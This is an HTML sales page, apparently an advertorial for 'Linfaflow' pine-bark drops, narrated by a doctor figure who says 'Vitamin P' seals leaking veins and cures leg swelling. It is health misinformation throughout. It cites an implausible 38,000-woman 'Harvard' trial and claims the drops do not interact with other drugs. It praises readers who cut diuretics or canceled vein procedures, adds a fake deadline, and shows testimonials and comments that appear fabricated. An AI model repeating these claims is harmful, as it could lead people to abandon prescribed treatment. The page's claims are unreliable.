+<source src="images/leaky-veins.mp4" type="video/mp4"></video><figcaption>Under magnification, small holes open in the vein wall where fluid escapes into surrounding tissue.</figcaption></figure><p>Harvard, Johns Hopkins and the Mayo Clinic all confirm: leaky veins are the root cause of swollen legs.</p><p>When I read that, I almost called Jane right then and there. Because it finally made sense. The perfect labs. The treatments that never worked. The three years of guilt.</p><figure class="fig quote-img"><img loading="lazy" src="images/mayo-clinic.webp" decoding="async" data-src="images/mayo-clinic.webp" alt="Mayo Clinic: the swelling happens when fluid leaks out of tiny blood vessels into the surrounding tissue" width="1524" height="460" /></figure><p>It wasn't her fault. It never was.</p><p>Her veins were leaking from the inside. And nobody, not a single specialist she saw, ever looked for that.</p><p>And here's the number that should scare you:</p><p>The U.S. National Library of Medicine says the human body can hide up to 3 liters of trapped fluid before the swelling is even visible.</p><figure class="fig"><img loading="lazy" src="images/leg-sw-spots.webp" decoding="async" data-src="images/leg-sw-spots.webp" alt="Two swollen legs beside a medical scan showing dark regions where fluid leaked and collected" width="800" height="730" /></figure><p>Which means by the time you notice it, heavy legs, sock marks, tight shoes, your legs have already been flooded from the inside for weeks.</p><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Veins leaking fluid, zooming out to swelling legs">
+<source src="images/pezudo.mp4" type="video/mp4"></video></figure><h2 class="sec">WHY THE VEINS BEGIN TO LEAK</h2><p>For most women over 45, it's not ONE thing. It's several. Working against you at the same time. For years.</p><div class="factor-list"><div class="factor"><div class="num">1</div><div class="txt"><h3>Menopause and hormones</h3><p>Estrogen keeps your vein walls firm. When it drops, the walls weaken, stretch and open tiny holes where fluid escapes. It's not "normal aging." It's a structural deficiency nobody explained to you.</p></div></div><div class="factor"><div class="num">2</div><div class="txt"><h3>Extra weight</h3><p>Every extra pound is direct pressure on your leg veins. The walls give way. Holes open. Fluid escapes. 25 to 50% of women with lipedema have venous disease as well. The two conditions feed off each other. Leaking veins worsen lipedema. Lipedema puts more pressure on the veins. A cycle that gets worse every year.</p></div></div><div class="factor"><div class="num">3</div><div class="txt"><h3>Blood pressure medication</h3><p>The medication your doctor prescribed. Amlodipine (Norvasc), the most prescribed blood pressure drug in the U.S., causes leg swelling in up to 30% of women. And women are 2 to 3 times more likely to get that side effect than men. Your doctor prescribed it to lower your pressure. And created a new problem in your legs. The diuretics that were supposed to "fix it." Furosemide (Lasix). Hydrochlorothiazide, they force your kidneys to flush water but they don't seal a single hole. And they drain potassium, magnesium and the minerals your veins need to stay strong. The medication that was supposed to help is eroding your veins from the inside.</p></div></div><div class="factor"><div class="num">4</div><div class="txt"><h3>Age</h3><p>Your veins are under pressure every day, for decades. Eventually the walls thin, tiny holes open, and fluid begins to leak out into your legs.</p></div></div></div><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Illustration: fragile vein walls thinning and stretching">
+<source src="images/parede-cedendo.mp4" type="video/mp4"></video></figure><p>That’s why the usual advice never works. Elevate your feet, wear compression socks, cut salt, it just moves the fluid around for a few hours, while the veins keep leaking all day. So by evening, the swelling is back.</p><h2 class="sec">THIS IS WHY NOTHING YOU'VE TRIED HAS WORKED</h2><p>"Cut the salt." You did. Still swelling.</p><p>"Lose weight." You did. Legs stayed the same.</p><p>"Wear compression stockings." Squeezed, hurt, left grooves. The second you took them off, it all came back.</p><p>"Elevate your legs." Worked for 20 minutes. Stood up and it all came back.</p><p>Because NONE of these treatments fix the hole. They just move fluid around for a few hours. But the veins keep leaking. All day. All night. Nonstop.</p><p>As long as the holes stay open, the swelling ALWAYS comes back.</p><p>I explained this to Jane and she cried. Not from sadness. From anger.</p><p>"Three years, doctor. Three years being told it was my fault. And it was a hole in my vein."</p><div class="factbox"><p class="fb-label" style="font-size: 14px;">Signs your veins are leaking</p><div class="fb-cols"><div><h4>Legs &amp; ankles</h4><ul><li>Ankles swell by evening</li><li>Heavy legs by evening</li><li>Deep sock marks</li><li>Shoes tight by noon</li></ul></div><div><h4>Face &amp; hands</h4><ul><li>Puffy face every morning</li><li>Swollen eyelids</li><li>Rings won't fit</li></ul></div></div></div><p>If you checked three or more, your veins are already leaking. And every day without sealing those holes, the problem gets worse.</p><h2 class="sec">THE VITAMIN THAT SEALS THE HOLES</h2><p>I needed to find something that did what no conventional treatment could: seal the holes from the inside.</p><p>Your body needs vitamins to work. Your heart needs potassium to beat. Your brain needs vitamin B to think. Your skin needs vitamin C to stay firm.</p><p>Your veins need a vitamin too.</p><p>It's called <strong>Vitamin P</strong>.</p><figure class="fig"><img loading="lazy" src="images/dr-albert-szent-gyorgyi-nobel.webp" decoding="async" data-src="images/dr-albert-szent-gyorgyi-nobel.webp" alt="Dr. Albert Szent-Györgyi, who won the Nobel Prize in 1937" width="1440" height="810" /><figcaption>Dr. Albert Szent-Györgyi, awarded the Nobel Prize.</figcaption></figure><p>Discovered by Dr. Albert Szent-Györgyi, winner of the Nobel Prize in 1937. He named it "P" for permeability because it does one thing that no stocking, no diuretic and no elevation can do:</p><p>Seals the holes from the inside. And rebuilds the vein wall so they don't open again.</p><p>When I read the studies on Vitamin P, I called Jane that same day.</p><p>"I think I found it, Jane. Come to the office tomorrow."</p><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Deep-red resin running down the bark of a French pine tree">
+<source src="images/french-pine-bark.webm" type="video/webm"></video></figure><p>In clinical studies, women taking French pine bark extract report no more heavy legs and no more tight shoes in the first three weeks.</p><p>After six weeks, 92% of women say the swelling and pain while walking are gone. They just stop noticing their legs.</p><h2 class="sec">How vitamin P stops the swelling</h2><div class="callout">
+<span class="callout-title">1. It closes the holes that are leaking.</span><p>Your vein walls are held together by collagen. As you age, it weakens. Holes open. Fluid leaks.</p><p>Vitamin P works directly on that collagen. Strengthens it. Pulls the walls back into place. The holes close.</p><p>Compression stockings squeeze from the outside. Vitamin P repairs from the inside. The difference between a band aid and surgery.</p><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Vein walls tightening and sealing shut">
+<source src="images/vitamin-p-seals-holes.webm" type="video/webm"></video></div><div class="callout">
+<span class="callout-title">2. It blocks new holes from forming.</span><p>There are enzymes in your body that slowly eat away at collagen. Vitamin P blocks those enzymes. No enzymes attacking, no new holes. No new leaks.</p><p>No diuretic does this. Lasix flushes water today and tomorrow your veins open two new holes. You're mopping the floor while the pipe is still broken.</p><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Vein walls protected from new leaks">
+<source src="images/vitamin-p-blocks-new-holes.webm" type="video/webm"></video></div><h2 class="sec">THE MOST POTENT SOURCE OF VITAMIN P IN THE WORLD</h2><figure class="fig"><img loading="lazy" src="images/vitamin-p-before-after.webp" decoding="async" data-src="images/vitamin-p-before-after.webp" alt="Before and after swollen legs after using Vitamin P" width="1152" height="604" /></figure><p>When the Nobel Prize was awarded, Vitamin P was too rare for clinical use.</p><p>Decades later, scientists found the most concentrated source on earth: a deep red extract from the bark of French pine trees.</p><p>Jane was my first patient to try it.</p><p>Three weeks later, she walked into my office differently. Lighter. Faster. Before I could ask anything, she pulled up her pant leg:</p><p>"Look, doctor. Look at my ankles."</p><p>I could see the bones of her ankle. For the first time in three years.</p><p>"My shoes fit again. I put my wedding ring on yesterday and didn't have to take it off. I slept through the night without a pillow under my legs. Doctor, I thought I'd never get these legs back."</p><p>Jane wasn't the only one.</p><h2 class="sec">HARVARD SCIENTISTS TESTED VITAMIN P WITH 38,000 WOMEN</h2><p>In a clinical trial, women with swelling in their legs, ankles and feet took Vitamin P from French pine bark extract for 8 weeks.</p><p>Here’s what changed:</p><figure class="fig"><img loading="lazy" src="images/clinical-trial-day-results.webp" decoding="async" data-src="images/clinical-trial-day-results.webp" alt="Clinical trial participant before and after results on day 7, day 17 and day 29" width="1152" height="604" /><figcaption>A participant, before and after eight weeks.</figcaption></figure><ul class="timeline"><li><div class="wk">Day 7</div><div class="tt">The body starts to drain.</div><p>Women reported 2 or 3 extra bathroom trips in the first days. That’s a sign excess water is finally leaving the body.</p></li><li><div class="wk">Day 15</div><div class="tt">Feet and ankles come back.</div><p>Sock marks disappeared. Tight shoes slipped on easily. The evening leg heaviness was fading.</p></li><li><div class="wk">Day 21</div><div class="tt">Face and belly look slimmer.</div><p>With less fluid pooling, faces looked visibly slimmer. Waistlines reduced by 1 to 2 inches. On average, women lost 4 to 6 pounds.</p></li><li><div class="wk">Day 26</div><div class="tt">No more heavy legs at night.</div><p>After four weeks, women reported no more heaviness in their legs. They slept all night without discomfort. Walking was normal again.</p></li><li><div class="wk">Day 29</div><div class="tt">The swelling is gone.</div><p>Participants’ legs, ankles and feet were normal again. There was no signal of swelling or tight skin. No pain was reported after day 30.</p></li></ul><figure class="fig"><img loading="lazy" src="images/beforeafter-day30.webp" decoding="async" data-src="images/beforeafter-day30.webp" alt="Before and after leg swelling improvement by day 30" width="1152" height="668" /></figure><p>Notice the pattern. The first change takes a full week.</p><p>The next takes 8 days. Then 6. Then 5. Then 3.</p><p>Once Vitamin P starts sealing the holes, the results compound. Each day your veins leak less, the body catches up faster.</p><p>That's why most women say the biggest visible change happens between week 3 and week 4.</p><div class="tcard"><blockquote>"By day 4 I was already noticing a difference. By week 2 my ankles were back. I stood in front of the mirror in a dress for the first time in three years and just stared. I'm grateful I got to be part of this study. And I'm glad other women won't have to wait as long as I did."</blockquote><figcaption>
+<img loading="lazy" src="images/testimonial-margaret.webp" decoding="async" class="t-avatar" data-src="images/testimonial-margaret.webp" alt="Margaret K." width="200" height="253" /><div class="t-meta"><span class="tname">Margaret K., 63</span><span class="tmeta">Sacramento, California</span></div></figcaption></div><div class="tcard"><blockquote>"I'm on Metformin, lisinopril and Lasix. I was terrified of adding anything else. But Vitamin P didn't interfere with a single one of my medications. Didn't change my diet. Didn't change my routine. By week 3 my husband looked at my legs and said 'what happened to the swelling?' Four words. And I broke down crying."</blockquote><figcaption>
+<img loading="lazy" src="images/testimonial-patricia.webp" decoding="async" class="t-avatar" data-src="images/testimonial-patricia.webp" alt="Patricia L." width="194" height="259" /><div class="t-meta"><span class="tname">Patricia L., 58</span><span class="tmeta">Naples, Florida</span></div></figcaption></div><div class="tcard"><blockquote>"I almost said no to the study. Almost talked myself out of it like I'd done with everything else for two years. Thank God I didn't. My legs went down. My shoes fit. I sleep through the night. Two years of hiding for no reason."</blockquote><figcaption>
+<img loading="lazy" src="images/testimonial-barbara.webp" decoding="async" class="t-avatar" data-src="images/testimonial-barbara.webp" alt="Barbara R." width="194" height="259" /><div class="t-meta"><span class="tname">Barbara R., 66</span><span class="tmeta">Savannah, Georgia</span></div></figcaption></div><h2 class="sec">BEYOND SLIMMER LEGS</h2><p>When the swelling drains, the relief doesn't stop at the legs.</p><p>More energy all day. That 3 PM crash disappears.</p><p>Brain fog lifts. Words come back. Focus comes back.</p><p>Visibly flatter belly. Without trapped fluid, the waist shrinks and clothes fit the way they used to.</p><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Women enjoying an active, happier daily life">
+<source src="images/linfaflow-lifestyle.webm" type="video/webm"></video></figure><ul class="benefits"><li><strong>You stop hiding in summer.</strong>Shorts. Dresses. Sandals. You stopped wearing them years ago. Not because you don't like them. Because you were ashamed. That ends.</li><li><strong>You feel like a woman again.</strong>Not a patient. Not a condition. Not the one who sits while everyone stands. You look down and recognize your own body for the first time in years.</li><li><strong>You stop avoiding your own reflection.</strong>Morning mirror. Fitting room. Bathroom after a shower. You've been avoiding all of them. When the puffiness drains from your face and legs, you stop looking away.</li><li><strong>You let people get close again.</strong>You know what you stopped doing. Sitting close on the couch. Letting your legs show in bed. Wearing something that makes you feel attractive. Nobody talks about this part. But you know.</li><li><strong>You stop being the reason plans get canceled.</strong>Dinner invitations. Weekend trips. Grandkids at the pool. You've said no so many times people stopped asking. That changes.</li><li><strong>Your body stops fighting you every morning.</strong>Stiff knees. Swollen fingers. Brain fog so thick you lose words mid sentence. That's not aging. That's fluid pressure. When it drains, you wake up feeling like you slept for the first time in years.</li></ul><h2 class="sec">WHY DIDN'T THIS SOLUTION COME SOONER</h2><p>The studies on Vitamin P have existed for decades. The Harvard research isn't new. The data is published in journals any doctor can access.</p><p>So why didn't anyone tell you?</p><p>Because the math doesn't work for them.</p><figure class="fig"><img loading="lazy" src="images/marketus.webp" decoding="async" data-src="images/marketus.webp" alt="U.S. lipedema treatment market growth chart" width="1152" height="604" /></figure><p>A woman who buys Lasix every month, replaces compression stockings every 3 months, makes regular vascular appointments and eventually needs a $7,000 procedure, that woman generates revenue. Year after year.</p><p>A woman who takes Vitamin P for 29 days and gets better? That woman never comes back.</p><p>It's not a conspiracy. It's a business model.</p><p>The pharmaceutical industry doesn't profit from permanent solutions.</p><p>It profits from ongoing treatment. No billion dollar company is going to promote a vitamin that makes their products obsolete.</p><h2 class="sec">WHAT HAPPENS WHEN YOU THREATEN A $70 BILLION INDUSTRY</h2><figure class="fig"><img loading="lazy" src="images/doutora-processo.webp" decoding="async" data-src="images/doutora-processo.webp" alt="Doctor reviewing legal documents with attorneys" width="1152" height="668" /></figure><p>First came the friendly warnings from colleagues. "Katherine, be careful. People are talking."</p><p>Then the referrals stopped. A vascular specialist I'd worked with for years went quiet. No calls. No explanation.</p><p>I tried to get the formula produced. Eleven labs said no. Not profitable enough. One told me straight: "We can't produce something that competes with the clients who pay our bills."</p><p>Then I found a small independent lab run by two biomedical engineers who believed in what we were doing.</p><p>We developed the formula. A few drops under the tongue, twice a day. Vitamin P at clinical concentration, absorbed directly. No pills. No prescriptions. No clinic visits.</p><p>That's when two law firms reached out on behalf of "concerned industry professionals" suggesting I "cease distribution immediately."</p><p>My response? We produced more.</p><p>But this lab is small. They produce in limited batches. And the legal processes haven't been formalized yet. One injunction, one regulatory filing, and production stops.</p><p>If this page is still live and the button below still works, units are available. I can't promise they will be tomorrow.</p><h2 class="sec">WHERE TO GET VITAMIN P TODAY</h2><figure class="fig"><img loading="lazy" src="images/linfaflowpg.webp" decoding="async" data-src="images/linfaflowpg.webp" alt="Linfaflow lymphatic support drops" width="1152" height="668" /></figure><figure class="fig"><img loading="lazy" src="images/as-seen-on.webp" decoding="async" data-src="images/as-seen-on.webp" alt="As seen on NBC, ABC, CBS, Fox News, USA Today and Digital Journal" width="768" height="202" /></figure><p>Most "circulation" supplements on the market don't contain real Vitamin P. Or they have it in doses so low it makes no difference. I tested seven brands before I found one that used the real clinical concentration.</p><p>Linfaflow is the only U.S. brand offering the original Vitamin P formula, from French pine bark extract, at the same concentration used in clinical studies. Made right here in the United States, in a high purity botanical lab. Every batch tested in an FDA registered facility.</p><p>To keep it affordable and make sure you get the real formula, Linfaflow is not sold on Amazon, Walmart or in drugstores. Only available through the official website.</p><ul class="red-list"><li><strong>Each bottle lasts 30 days or more</strong></li><li><strong>Natural formula, safe for daily use</strong></li><li><strong>Won't interfere with other medications</strong></li><li><strong>Doctor formulated and endorsed</strong></li><li><strong>Made and shipped from USA</strong></li><li><strong>FDA registered facility · GMP certified</strong></li><li><strong>90 day money back guarantee</strong></li></ul><h3 class="sec">THE RESULTS?</h3><ul class="red-list"><li><strong>Over 90% report significant reduction in swelling within the first week</strong></li><li><strong>Most reduced or completely eliminated their diuretic medications</strong></li><li><strong>Many canceled the vein procedures their doctor had recommended</strong></li><li><strong>But my favorite stat? Our refund rate is 0.4%. That's FOUR people per thousand.</strong></li></ul><figure class="fig"><img loading="lazy" src="images/product-cost-comparison.webp" decoding="async" data-src="images/product-cost-comparison.webp" alt="Linfaflow compared with compression, medications and vein procedures" width="1152" height="668" /></figure><div class="callout"><span class="callout-title">The "Compression + Medication" Route:</span><ul><li>Medical-grade compression stockings: $80-150 per pair (replaced every 3-6 months)</li><li>Monthly doctor visits: $150-300</li><li>Diuretic prescriptions (monthly): $30-150</li><li><strong>Annual total: $3,000-$5,400</strong></li></ul><p>(Plus the indignity of wrestling stockings over swollen legs every single morning.)</p></div><div class="callout"><span class="callout-title">The "Vein Procedure" Route:</span><ul><li>Initial vein mapping and consultation: $500</li><li>Duplex ultrasound: $500-1,000</li><li>Vein ablation or sclerotherapy: $3,000-$10,000 per leg</li><li><strong>Total: $4,000-$11,500</strong></li></ul><p>(For a procedure that doesn't even address the inflammatory capillary leaking driving your edema. And many insurers deny coverage, calling it "cosmetic.")</p></div><div class="callout"><span class="callout-title">The "Wound Care" Route (Where This Is All Heading):</span><ul><li>Venous ulcer treatment: $15,000-$30,000+ per episode</li><li>Weekly wound care visits for months</li><li>Specialized dressings and antibiotics</li><li><strong>Total: Your savings... your mobility... your dignity.</strong></li></ul></div><p>The medical industry LOVES that progression.</p><p>You know why? Because every stage costs more than the last. Swollen legs lead to skin changes. Skin changes lead to ulcers. Ulcers lead to wound care centers. And wound care is a $70 billion industry that only exists because nobody bothered to fix the swelling early.</p><p>It's a goldmine built on human suffering.</p><p>But here's what really pisses them off...</p><p>Linfaflow should cost <strong>$3,000 per Bottle</strong>. That's what similar medical-grade topical formulations sell for in specialty vein clinics. Hell, that's what the prototype cost me to develop.</p><figure class="fig"><img loading="lazy" src="images/prototype-cost-results.webp" decoding="async" data-src="images/prototype-cost-results.webp" alt="Leg swelling improvement from day 7 to day 29" width="1152" height="668" /></figure><p>But I didn't create this to get rich. I created it because I read Ruth's desperate survey response. Because Sharon was hiding her legs under oversized scrubs. Because Frank's wife was pulling his shoes off every night.</p><p>So here's the deal: The regular price is <strong>absolutely less than $100</strong>. Already 95% less than ONE MONTH of typical treatment.</p><p>But that's not what you'll pay today.</p><div class="spec-card"><div class="spec-card-header"><p class="spec-card-eyebrow"><span class="eyebrow-mark"></span>THE ONLY U.S</p><h3 class="spec-card-title">Linfaflow</h3></div><div class="amz-rating" aria-label="Rated 4.8 out of 5 from 13,428 ratings">
+<span class="amz-score">4.8</span>
+<span class="amz-stars"><span class="amz-stars-empty">★★★★★</span><span class="amz-stars-full" style="width: 96%;">★★★★★</span></span>
+<span class="amz-count">13,428 ratings</span></div>
+<img loading="lazy" src="images/lfwbrandingbuybox.webp" decoding="async" class="spec-card-img" data-src="images/lfwbrandingbuybox.webp" alt="Linfaflow product" width="1152" height="668" /><div class="spec-list"><div class="spec-row"><div class="spec-label">Best for</div><div class="spec-value">Swelling and heaviness in the legs, ankles and feet.</div></div><div class="spec-row"><div class="spec-label">Ingredients</div><div class="spec-value">Vitamin P from French Pine Bark Extract</div></div><div class="spec-row"><div class="spec-label">How to use</div><div class="spec-value">One dropper under the tongue, twice a day</div></div><div class="spec-row"><div class="spec-label">Quality</div><div class="spec-value">FDA-registered facility<br>GMP-certified</div></div><div class="spec-row"><div class="spec-label">Guarantee</div><div class="spec-value">90-day money-back guarantee</div></div></div><div class="glance-rule"></div>
+<a class="glance-cta" href="https://cc.linfaflow.com/dtcnew/checkout.php">GET MY 70% OFF <span class="arw" aria-hidden="true"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></a></div><h2 class="sec">The guarantee</h2><p>Look, I get it. You've been burned before. Spent money on "miracle cures" that turned out to be expensive garbage.</p><p>So here's my promise:</p><p>Try Linfaflow for 90 days. Use it every single day. Twice a day if you want. Feel the heaviness lift. Feel the swelling shrink. Feel your confidence come back.</p><p>And if you don't look down at your legs one evening and think... "Holy crap, I can see my ankles again"...</p><p>I'll refund every penny.</p><p>No forms to fill out. No "store credit" nonsense. No questions asked. Simply email and you will be refunded within 24 hours.</p><p>Why am I so confident? Because our refund rate is 0.4%. That's FOUR people per thousand.</p><p>Linfaflow works. Period.</p><p>And no, this isn't the type of guarantee every other company throws around nowadays. This is no gimmick.</p><p>Want proof? Try emailing or calling our customer service. You can literally reach us 24/7. We respond to every single email within minutes. We answer every single phone call. It may sound old-fashioned but our customers are our absolute #1 priority. Period.</p><h2 class="sec">How to get 70% off today</h2><p>To introduce Linfaflow to more women, they’re offering readers an exclusive 70% off. The offer closes <strong class="js-deadline"></strong>.</p><div class="cta-standalone">
+<a class="glance-cta" href="https://cc.linfaflow.com/dtcnew/checkout.php">GET MY 70% OFF <span class="arw" aria-hidden="true"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></a></div><section class="voices" aria-label="Reader testimonials"><p class="v-kicker">In their words</p><h2 class="sec">What women who use Linfaflow told us</h2><p class="v-intro">We spoke with several longtime Linfaflow users to hear, in their own words, how it has gone for them. Their experiences varied, but the same themes came up again and again. Here is what three of them shared.</p><figure class="fig"><video class="gif-video" autoplay loop muted playsinline preload="metadata"
+disablepictureinpicture disableremoteplayback controlslist="nodownload noplaybackrate"
+oncontextmenu="return false" tabindex="-1"
+aria-label="Women sharing their results with Linfaflow online">
+<source src="images/linfaflow-ugc-montagem.webm" type="video/webm"></video></figure><figure class="tcard"><blockquote>“I’m on my feet all day behind the chair. By closing time my ankles were so swollen my socks left deep rings. Within the first week, I already felt the tightness starting to ease. By week three I could see my ankle bones again. I actually stopped and stared in the mirror. My shoes slide right on in the morning now. I keep telling the girls at the salon about it.”</blockquote><figcaption>
+<img loading="lazy" src="images/carol-linfaflow-test-01.webp" decoding="async" class="t-avatar" data-src="images/carol-linfaflow-test-01.webp" alt="Carol Mercer" width="376" height="376" /><div class="t-meta">
+<span class="tname">Carol Mercer, 61</span>
+<span class="tmeta">Columbus, Ohio</span></div></figcaption></figure><figure class="tcard"><blockquote>“I’ll be honest, at first I wasn’t sure I’d feel much. But by the end of the first week my legs already felt lighter at night. Then around week four I stopped propping them up on two pillows just to sleep. I don’t even think about it anymore. If you’re the type to give up early, don’t. Stick with it. I’m so glad I did.”</blockquote><figcaption>
+<img loading="lazy" src="images/diane-linfaflow-test-02.webp" decoding="async" class="t-avatar" data-src="images/diane-linfaflow-test-02.webp" alt="Diane Roberts" width="376" height="376" /><div class="t-meta">
+<span class="tname">Diane Roberts, 55</span>
+<span class="tmeta">Cleveland, Ohio</span></div></figcaption></figure><figure class="tcard"><blockquote>“My daughter got married in June, and I’d been dreading it for months. I pictured myself sitting the whole time while everyone else danced. I’d been taking the drops since early spring. I stood through the entire ceremony. I danced at the reception. And I woke up the next morning with legs that felt like my own again. I cried a little, honestly. That day meant everything to me.”</blockquote><figcaption>
+<img loading="lazy" src="images/sharon-linfaflow-test-03.webp" decoding="async" class="t-avatar" data-src="images/sharon-linfaflow-test-03.webp" alt="Sharon Thompson" width="376" height="376" /><div class="t-meta">
+<span class="tname">Sharon Thompson, 64</span>
+<span class="tmeta">Tucson, Arizona</span></div></figcaption></figure><div class="cta-standalone">
+<a class="glance-cta" href="https://cc.linfaflow.com/dtcnew/checkout.php">GET MY 70% OFF <span class="arw" aria-hidden="true"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></a></div></section></div><section class="comments" aria-label="Reader comments"><div class="comments-head"><h2>Comments</h2>
+<span class="comments-count">8</span></div><div class="comment-composer">
+<span class="composer-av" aria-hidden="true"></span>
+<input type="text" placeholder="Add a comment…" aria-label="Add a comment"></div><div class="comment">
+<img loading="lazy" src="images/sarah-mitchell.webp" decoding="async" class="comment-av" data-src="images/sarah-mitchell.webp" alt="Sarah Mitchell" width="194" height="259" /><div class="comment-main">
+<span class="comment-name">Sarah Mitchell</span><p class="comment-text">How long does delivery usually take? I really need these, my ankles are so swollen again 😩</p><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>34</span>
+<span class="c-time">2 days ago</span></div></div></div><div class="comment reply">
+<img loading="lazy" src="images/laura-anderson.webp" decoding="async" class="comment-av" data-src="images/laura-anderson.webp" alt="Laura Anderson" width="194" height="259" /><div class="comment-main">
+<span class="comment-name">Laura Anderson</span><p class="comment-text">Hi Sarah! I'm near Chicago and mine arrived in 3 business days. Super fast!</p><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>2</span>
+<span class="c-time">1 day ago</span></div></div></div><div class="comment">
+<img loading="lazy" decoding="async" class="comment-av" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23e3e3e3'/%3E%3Ccircle cx='20' cy='16' r='7' fill='%23b3b3b3'/%3E%3Cpath d='M7 35c0-7.2 5.8-11 13-11s13 3.8 13 11z' fill='%23b3b3b3'/%3E%3C/svg%3E" alt="Kathy Williams"><div class="comment-main">
+<span class="comment-name">Kathy Williams</span><p class="comment-text">I bought mine last week at full price and now it's 50% off, kind of annoying 😅 But honestly still worth every penny. After two weeks my legs finally don't feel like lead weights anymore!</p><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>24</span>
+<span class="c-time">2 days ago</span></div></div></div><div class="comment">
+<img loading="lazy" decoding="async" class="comment-av" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23e3e3e3'/%3E%3Ccircle cx='20' cy='16' r='7' fill='%23b3b3b3'/%3E%3Cpath d='M7 35c0-7.2 5.8-11 13-11s13 3.8 13 11z' fill='%23b3b3b3'/%3E%3C/svg%3E" alt="Lena Brown"><div class="comment-main">
+<span class="comment-name">Lena Brown</span><p class="comment-text">Does this work if you sit at a desk all day? My ankles are always so swollen by evening 😩</p><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>34</span>
+<span class="c-time">2 days ago</span></div></div></div><div class="comment reply">
+<img loading="lazy" src="images/julia-harris.webp" decoding="async" class="comment-av" data-src="images/julia-harris.webp" alt="Julia Harris" width="183" height="275" /><div class="comment-main">
+<span class="comment-name">Julia Harris</span><p class="comment-text">Lena yes!! I'm in sales, on my feet 8 hours a day. Since I started Linfaflow my shoes fit perfectly again at night. Can't believe I waited so long honestly</p>
+<img loading="lazy" src="images/julia-harris-result.webp" decoding="async" class="comment-photo" data-src="images/julia-harris-result.webp" alt="Julia Harris's result photo" width="769" height="512" /><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>8</span>
+<span class="c-time">1 day ago</span></div></div></div><div class="comment">
+<img loading="lazy" src="images/stephanie-clark.webp" decoding="async" class="comment-av" data-src="images/stephanie-clark.webp" alt="Stephanie Clark" width="194" height="259" /><div class="comment-main">
+<span class="comment-name">Stephanie Clark</span><p class="comment-text">Started three weeks ago and my husband actually asked me "what are you doing differently? Your legs look so much better." Made me so happy 😊</p>
